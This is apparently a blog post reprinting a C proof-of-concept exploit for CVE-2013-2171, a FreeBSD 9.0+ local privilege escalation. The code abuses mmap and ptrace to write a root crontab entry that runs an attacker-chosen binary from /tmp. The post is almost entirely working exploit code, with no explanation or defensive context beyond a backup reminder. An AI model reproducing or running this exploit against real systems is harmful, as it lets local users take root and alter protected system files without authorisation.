title: "FreeBSD 9.0+ Privilege escalation via mmap"
date: 2013-06-24 17:15:48
tags:
id: 297
comment: false
categories:
  - exploit
---

<pre class="brush:cpp">/* 
 * CVE-2013-2171 FreeBSD 9.0+ Privilege escalation via mmap
 *
 * poc by SynQ, rdot.org, 6/2013
 *
 * don't forget to cp /etc/crontab /tmp
 *
 */
 #include &lt;unistd.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;sys/mman.h&gt;
 #include &lt;sys/ptrace.h&gt;
 #include &lt;sys/wait.h&gt;
 #include &lt;fcntl.h&gt;
 #include &lt;sys/types.h&gt;

 char sc[]="*\t*\t*\t*\t*\troot\t/tmp/bukeke\n#";

 void child() {
 int status;

 status = ptrace(PT_TRACE_ME, 0, 0, 0);
 if (status != 0)
 printf("child ptrace error\n");
 exit(1);
 }

 int main() {
 int pid, fd, i;
 char *addr;

 fd = open("/etc/crontab", O_RDONLY);
 if (fd&lt;0) {
 printf("open failed\n");
 exit(1);
 }

 addr = mmap(0, 4096, PROT_READ, MAP_SHARED, fd, 0);
 if (addr == MAP_FAILED) {
 printf("mmap fault\n");
 exit(1);
 }

 pid = fork();
 if (pid == -1) {
 printf("fork failed\n");
 exit(1);
 }
 else if (pid == 0)
 child();

 ptrace(PT_ATTACH, pid, 0, 0);
 if (wait(0) == -1) {
 printf("wait failed\n");
 exit(1);
 }
 printf("writing shellcode...\n");

 for(i=0; i &lt; sizeof(sc)/4; i++)
 ptrace(PT_WRITE_D, pid, addr+i*4, *(int*)&amp;sc[i*4]);

 ptrace(PT_DETACH, pid, 0, 0);
 if (wait(0) == -1) {
 printf("wait2 failed\n");
 exit(1);
 }

 printf("done.\n");
 return 0;
 }</pre>